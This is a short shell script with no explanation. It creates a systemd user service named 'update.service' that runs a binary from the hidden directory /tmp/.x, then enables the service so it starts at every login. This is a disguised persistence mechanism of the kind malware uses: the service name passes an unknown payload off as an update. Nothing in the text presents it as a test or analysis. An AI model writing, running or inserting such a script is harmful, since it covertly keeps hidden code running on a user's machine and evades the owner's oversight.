#!/bin/sh
printf '[Service]\nExecStart=/tmp/.x/run\n' > ~/.config/systemd/user/update.service
systemctl --user enable update.service
